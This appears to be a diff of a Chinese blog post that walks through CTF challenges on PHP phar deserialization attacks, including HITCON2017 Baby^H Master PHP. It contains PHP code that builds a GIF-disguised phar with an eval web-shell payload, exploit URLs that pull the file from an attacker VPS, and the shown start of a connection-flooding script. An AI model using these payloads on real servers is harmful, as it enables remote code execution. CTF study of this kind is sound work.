@@ -1,118 +1,571 @@
-<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>PHP反序列化学习之phar攻击 | osword's blog</title><meta name="description" content="概述这周准备抓一抓PHP序列化相关的知识,所以有了下面这些东西. Phar定义简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:&#x2F;&#x2F; php:&#x2F;&#x2F;等类似，也是一种流包装器。phar结构由 4 部分组成  stub phar 文件标识，格式为 xxx；manifest 压缩文件的属性等信息，以序列化存储；contents 压"><meta name="keywords" content="PHP反序列化"><meta name="author" content="osword"><meta name="copyright" content="osword"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="dns-prefetch" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin="crossorigin"/><link rel="dns-prefetch" href="https://fonts.googleapis.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="dns-prefetch" href="//busuanzi.ibruce.info"/><meta name="twitter:card" content="summary"><meta name="twitter:title" content="PHP反序列化学习之phar攻击"><meta name="twitter:description" content="概述这周准备抓一抓PHP序列化相关的知识,所以有了下面这些东西. Phar定义简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:&#x2F;&#x2F; php:&#x2F;&#x2F;等类似，也是一种流包装器。phar结构由 4 部分组成  stub phar 文件标识，格式为 xxx；manifest 压缩文件的属性等信息，以序列化存储；contents 压"><meta name="twitter:image" content="http://zhzhdoai.github.io/img/404.jpg"><meta property="og:type" content="article"><meta property="og:title" content="PHP反序列化学习之phar攻击"><meta property="og:url" content="http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/"><meta property="og:site_name" content="osword's blog"><meta property="og:description" content="概述这周准备抓一抓PHP序列化相关的知识,所以有了下面这些东西. Phar定义简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:&#x2F;&#x2F; php:&#x2F;&#x2F;等类似，也是一种流包装器。phar结构由 4 部分组成  stub phar 文件标识，格式为 xxx；manifest 压缩文件的属性等信息，以序列化存储；contents 压"><meta property="og:image" content="http://zhzhdoai.github.io/img/404.jpg"><meta property="article:published_time" content="2019-05-22T12:57:45.000Z"><meta property="article:modified_time" content="2020-05-15T08:31:42.000Z"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>var autoChangeMode = '1'
-var t = Cookies.get("theme")
-if (autoChangeMode == '1'){
-  var isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
-  var isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
-  var isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
-  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
 
-  if (t === undefined){
-    if (isLightMode) activateLightMode()
-    else if (isDarkMode) activateDarkMode()
-    else if (isNotSpecified || hasNoSupport){
-      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
-      var now = new Date()
-      var hour = now.getHours()
-      var isNight = hour < 6 || hour >= 18
-      isNight ? activateDarkMode() : activateLightMode()
-  }
-  } else if (t == 'light') activateLightMode()
-  else activateDarkMode()
 
-} else if (autoChangeMode == '2'){
-  now = new Date();
-  hour = now.getHours();
-  isNight = hour < 6 || hour >= 18
-  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
-  else if (t === 'light') activateLightMode()
-  else activateDarkMode() 
-} else {
-  if ( t == 'dark' ) activateDarkMode()
-  else if ( t == 'light') activateLightMode()
-}
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;dark&#34;>
 
-function activateDarkMode(){
-  document.documentElement.setAttribute('data-theme', 'dark')
-  if (document.querySelector('meta[name="theme-color"]') !== null){
-    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
-  }
-}
-function activateLightMode(){
-  document.documentElement.setAttribute('data-theme', 'light')
-  if (document.querySelector('meta[name="theme-color"]') !== null){
-  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
-  }
-}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="http://zhzhdoai.github.io/2019/05/22/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0%E4%B9%8Bphar%E6%94%BB%E5%87%BB/"><link rel="prev" title="2019ISCC_web题解" href="http://zhzhdoai.github.io/2019/05/28/2019ISCC-web%E9%A2%98%E8%A7%A3/"><link rel="next" title="RCTF | nextphp题解" href="http://zhzhdoai.github.io/2019/05/21/RCTF-nextphp%E9%A2%98%E8%A7%A3/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
-  root: '/',
-  algolia: undefined,
-  localSearch: undefined,
-  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://xxx/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
-  copy: {
-    success: '复制成功',
-    error: '复制错误',
-    noSupport: '浏览器不支持'
-  },
-  bookmark: {
-    message_prev: '按',
-    message_next: '键将本页加入书签'
-  },
-  runtime_unit: '天',
-  runtime: true,
-  copyright: undefined,
-  ClickShowText: undefined,
-  medium_zoom: false,
-  fancybox: true,
-  Snackbar: undefined,
-  baiduPush: false,
-  highlightCopy: true,
-  highlightLang: true,
-  highlightShrink: 'false',
-  isFontAwesomeV5: false,
-  isPhotoFigcaption: false,
-  islazyload: false,
-  isanchor: false
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
-}</script><script>var GLOBAL_CONFIG_SITE = { 
-  isPost: true,
-  isHome: false,
-  isSidebar: true  
-  }</script><noscript><style>
-#page-header {
-  opacity: 1
-}
-.justified-gallery img{
-  opacity: 1
-}
-</style></noscript><meta name="generator" content="Hexo 4.2.1"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">139</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">36</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div></div></div><i class="fa fa-arrow-right on" id="toggle-sidebar" aria-hidden="true">     </i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Phar定义"><span class="toc-number">2.</span> <span class="toc-text">Phar定义</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF-1"><span class="toc-number">3.</span> <span class="toc-text">CTF_1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CTF-2"><span class="toc-number">4.</span> <span class="toc-text">CTF_2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HITCON2017-Baby-H-Master-PHP-2017"><span class="toc-number">4.1.</span> <span class="toc-text">HITCON2017 Baby^H Master PHP 2017</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#多线程请求"><span class="toc-number">5.</span> <span class="toc-text">多线程请求</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#参考链接"><span class="toc-number">6.</span> <span class="toc-text">参考链接</span></a></li></ol></div></div></div><div id="body-wrap"><div class="post-bg" id="nav" style="background-image: url(/img/404.jpg)"><div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">osword's blog</a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span></span></div><div id="post-info"><div id="post-title"><div class="posttitle">PHP反序列化学习之phar攻击</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2019-05-22 20:57:45"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2019-05-22</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2020-05-15 16:31:42"><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-05-15</span></time></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="fa fa-eye post-meta__icon" aria-hidden="true"> </i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-commentcount"></span></div></div></div></div><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这周准备抓一抓PHP序列化相关的知识,所以有了下面这些东西.</p>
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="osword">
+  <meta name="keywords" content="">
+  <title>PHP反序列化学习之phar攻击 - osword&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/darcula.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2019-05-22 20:57" pubdate>
+        2019年5月22日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      13
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">PHP反序列化学习之phar攻击</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>这周准备抓一抓PHP序列化相关的知识,所以有了下面这些东西.</p>
 <h1 id="Phar定义"><a href="#Phar定义" class="headerlink" title="Phar定义"></a>Phar定义</h1><p>简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与<code>file:// php://</code>等类似，也是一种流包装器。<br>phar结构由 4 部分组成</p>
 <blockquote>
 <p>stub phar 文件标识，格式为 xxx<?php xxx; __HALT_COMPILER();?>；<br>manifest 压缩文件的属性等信息，以<strong>序列化</strong>存储；<br>contents 压缩文件的内容；<br>signature 签名，放在文件末尾；</p>
 </blockquote>
 <p>这里有两个关键点，一是文件标识，必须以<code>__HALT_COMPILER();?&gt;</code>结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；二是反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过<code>phar://</code>伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多，包括下面这些：</p>
-<p><img src="./1.png" alt=""></p>
-<h1 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF_1"></a>CTF_1</h1><p><img src="./1.png" alt=""></p>
+<p><img src="./1.png" srcset="/img/loading.gif" alt=""></p>
+<h1 id="CTF-1"><a href="#CTF-1" class="headerlink" title="CTF_1"></a>CTF_1</h1><p><img src="./1.png" srcset="/img/loading.gif" alt=""></p>
 <p><code>Phar://</code>协议流只要出现phar标识头就会解析，所以我们可以直接改成gif格式文件<br>根据上述poc创建出poc1.gif上传后，通过<code>file_exists</code>触发文件反序列化</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Myclass&#123;</span><br><span class="line">    var  $output&#x3D;&#39;@eval($_GET[&quot;a&quot;]);&#39;;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$o&#x3D;new Myclass();</span><br><span class="line">$filename&#x3D;&#39;poc1.phar&#39;;&#x2F;&#x2F;1.后缀必须为phar</span><br><span class="line">file_exists($filename)?@unlink($filename):null;</span><br><span class="line">$phar&#x3D;new Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;);&#x2F;&#x2F;2.phar 文件标识</span><br><span class="line">$phar-&gt;setMetadata($o);&#x2F;&#x2F;3.压缩文件的属性等信息</span><br><span class="line">$phar-&gt;addFromString(&quot;foo.txt&quot;,&quot;bar&quot;);&#x2F;&#x2F;4.压缩文件的内容</span><br><span class="line">$phar-&gt;stopBuffering();&#x2F;&#x2F;5.签名</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+<span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Myclass</span></span>&#123;</span>
+<span class="php">    <span class="hljs-keyword">var</span>  $output=<span class="hljs-string">'@eval($_GET["a"]);'</span>;</span>
+<span class="php">    </span>
+<span class="php">&#125;</span>
+<span class="php">$o=<span class="hljs-keyword">new</span> Myclass();</span>
+<span class="php">$filename=<span class="hljs-string">'poc1.phar'</span>;<span class="hljs-comment">//1.后缀必须为phar</span></span>
+<span class="php">file_exists($filename)?@unlink($filename):<span class="hljs-keyword">null</span>;</span>
+<span class="php">$phar=<span class="hljs-keyword">new</span> Phar($filename);</span>
+<span class="php">$phar-&gt;startBuffering();</span>
+<span class="php">$phar-&gt;setStub(<span class="hljs-string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="hljs-comment">//2.phar 文件标识</span></span>
+<span class="php">$phar-&gt;setMetadata($o);<span class="hljs-comment">//3.压缩文件的属性等信息</span></span>
+<span class="php">$phar-&gt;addFromString(<span class="hljs-string">"foo.txt"</span>,<span class="hljs-string">"bar"</span>);<span class="hljs-comment">//4.压缩文件的内容</span></span>
+<span class="php">$phar-&gt;stopBuffering();<span class="hljs-comment">//5.签名</span></span>
+<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre>
 
 
-<p><code>127.0.0.1/phar/file.php?filename=phar://poc1.gif&amp;a=phpinfo();</code><br><img src="./2.png" alt=""></p>
-<h1 id="CTF-2"><a href="#CTF-2" class="headerlink" title="CTF_2"></a>CTF_2</h1><h2 id="HITCON2017-Baby-H-Master-PHP-2017"><a href="#HITCON2017-Baby-H-Master-PHP-2017" class="headerlink" title="HITCON2017 Baby^H Master PHP 2017"></a>HITCON2017 Baby^H Master PHP 2017</h2><p><img src="./3.png" alt=""></p>
+<p><code>127.0.0.1/phar/file.php?filename=phar://poc1.gif&amp;a=phpinfo();</code><br><img src="./2.png" srcset="/img/loading.gif" alt=""></p>
+<h1 id="CTF-2"><a href="#CTF-2" class="headerlink" title="CTF_2"></a>CTF_2</h1><h2 id="HITCON2017-Baby-H-Master-PHP-2017"><a href="#HITCON2017-Baby-H-Master-PHP-2017" class="headerlink" title="HITCON2017 Baby^H Master PHP 2017"></a>HITCON2017 Baby^H Master PHP 2017</h2><p><img src="./3.png" srcset="/img/loading.gif" alt=""></p>
 <p>代码<strong>第40行</strong>进行反序列化，回溯到<strong>第9行</strong>是对<code>user</code>类进行反序列化。<br>通读代码可知需要构造反序列化Admin类触发<code>__destruct</code>，执行<code>create_function</code>创建匿名函数，通过<code>$_GET[‘lucky’]()</code>执行匿名函数得到Flag.</p>
 <p><code>$data</code>通过<code>cookie</code>传入，可控。但是在<code>check_session()</code>方法对<code>$data</code>进行hash验证。很显然我们得不到<code>secret</code>。</p>
-<p><img src="./4.png" alt=""></p>
+<p><img src="./4.png" srcset="/img/loading.gif" alt=""></p>
 <p>看来伪照<code>$data</code>无果，看到<code>upload()</code>方法有<code>file_get_contents</code>方法，由文章开头可知该方法可以触发phar反序列化。<br>我们可以通过<code>$_GET[‘url’]</code>借助<code>vps</code>上传<code>avatar.gif</code>，Poc构造如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User &#123; </span><br><span class="line">    public $avatar; </span><br><span class="line">    function __construct($path) &#123; </span><br><span class="line">        $this-&gt;avatar &#x3D; &#39;随便填&#39;; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">class Admin extends User &#123; </span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line">$o&#x3D;new Admin();</span><br><span class="line">$filename&#x3D;&#39;poc1.phar&#39;;&#x2F;&#x2F;1.后缀必须为phar</span><br><span class="line">file_exists($filename)?@unlink($filename):null;</span><br><span class="line">$phar&#x3D;new Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;);&#x2F;&#x2F;2.phar 文件标识</span><br><span class="line">$phar-&gt;setMetadata($o);&#x2F;&#x2F;3.压缩文件的属性等信息</span><br><span class="line">$phar-&gt;addFromString(&quot;foo.txt&quot;,&quot;bar&quot;);&#x2F;&#x2F;4.压缩文件的内容</span><br><span class="line">$phar-&gt;stopBuffering();&#x2F;&#x2F;5.签名</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs xml"><span class="php"><span class="hljs-meta">&lt;?php</span></span>
+
+<span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">User</span> </span>&#123; </span>
+<span class="php">    <span class="hljs-keyword">public</span> $avatar; </span>
+<span class="php">    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($path)</span> </span>&#123; </span>
+<span class="php">        <span class="hljs-keyword">$this</span>-&gt;avatar = <span class="hljs-string">'随便填'</span>; </span>
+<span class="php">    &#125; </span>
+<span class="php">&#125; </span>
+
+<span class="php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Admin</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">User</span> </span>&#123; </span>
+
+<span class="php">&#125; </span>
+<span class="php">$o=<span class="hljs-keyword">new</span> Admin();</span>
+<span class="php">$filename=<span class="hljs-string">'poc1.phar'</span>;<span class="hljs-comment">//1.后缀必须为phar</span></span>
+<span class="php">file_exists($filename)?@unlink($filename):<span class="hljs-keyword">null</span>;</span>
+<span class="php">$phar=<span class="hljs-keyword">new</span> Phar($filename);</span>
+<span class="php">$phar-&gt;startBuffering();</span>
+<span class="php">$phar-&gt;setStub(<span class="hljs-string">"GIF89a&lt;?php __HALT_COMPILER(); ?&gt;"</span>);<span class="hljs-comment">//2.phar 文件标识</span></span>
+<span class="php">$phar-&gt;setMetadata($o);<span class="hljs-comment">//3.压缩文件的属性等信息</span></span>
+<span class="php">$phar-&gt;addFromString(<span class="hljs-string">"foo.txt"</span>,<span class="hljs-string">"bar"</span>);<span class="hljs-comment">//4.压缩文件的内容</span></span>
+<span class="php">$phar-&gt;stopBuffering();<span class="hljs-comment">//5.签名</span></span>
+<span class="php"><span class="hljs-meta">?&gt;</span></span></code></pre>
 
 <p>接下来就是执行怎样通过<code>$_GET[‘lucky’]</code>执行匿名函数问题。</p>
 <p>源码分析匿名函数具体见我一篇文章：create_function任意代码执行</p>
 <p>那么怎样才能得到匿名函数名，可以参考： <code>Apache的三种MPM模式比较：prefork，worker，event</code>。当用户请求过大时，超过 apache 默认设定的阀值时，就会启动新的线程来处理请求，此时在新的线程中，匿名函数的名字又会从1开始递增，这样我们就容易猜测匿名函数的名字了。</p>
 <p>将生成的 <strong>poc1.phar</strong> 放在自己的 <strong>VPS</strong> 上并重命名成 <strong>avatar.gif</strong>，然后将文件上传到题目服务器上：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;题目IP&#x2F;index.php?m&#x3D;upload&amp;url&#x3D;http:&#x2F;&#x2F;VPS_IP&#x2F;</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>题目IP<span class="hljs-regexp">/index.php?m=upload&amp;url=http:/</span><span class="hljs-regexp">/VPS_IP/</span></code></pre>
 
 <p>接着，我们需要通过大量请求，使 <strong>apache</strong> 重新开启一个新的线程，然后访问如下 <strong>url</strong> 即可完成反序列化并获得 <strong>flag</strong> ：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;题目IP&#x2F;index.php?m&#x3D;upload&amp;url&#x3D;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;data&#x2F;$SANDBOX&#x2F;&amp;lucky&#x3D;%00lambda_</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>题目IP<span class="hljs-regexp">/index.php?m=upload&amp;url=phar:/</span><span class="hljs-regexp">//</span>var<span class="hljs-regexp">/www/</span>data<span class="hljs-regexp">/$SANDBOX/</span>&amp;lucky=%<span class="hljs-number">00</span>lambda_</code></pre>
 
-<h1 id="多线程请求"><a href="#多线程请求" class="headerlink" title="多线程请求"></a>多线程请求</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># coding: UTF-8</span><br><span class="line"># Author: orange@chroot.org</span><br><span class="line"># </span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">import socket</span><br><span class="line">import time</span><br><span class="line">from multiprocessing.dummy import Pool as ThreadPool</span><br><span class="line">try:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line">except:</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def run(i):</span><br><span class="line">    while 1:</span><br><span class="line">        HOST &#x3D; &#39;127.0.0.1&#39;</span><br><span class="line">        PORT &#x3D; 80</span><br><span class="line">        s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(&#39;GET &#x2F; HTTP&#x2F;1.1\nHost: 54.238.212.199\nConnection: Keep-Alive\n\n&#39;)</span><br><span class="line">        # s.close()</span><br><span class="line">        print &#39;ok&#39;</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line"></span><br><span class="line">i &#x3D; 8</span><br><span class="line">pool &#x3D; ThreadPool( i )</span><br><span class="line">result &#x3D; pool.map_async( run, range(i) ).get(0xffff)</span><br></pre></td></tr></table></figure>
+<h1 id="多线程请求"><a href="#多线程请求" class="headerlink" title="多线程请求"></a>多线程请求</h1><pre><code class="hljs routeros"><span class="hljs-comment"># coding: UTF-8</span>
+<span class="hljs-comment"># Author: orange@chroot.org</span>
+<span class="hljs-comment"># </span>
+
+import requests
+import socket
+import time
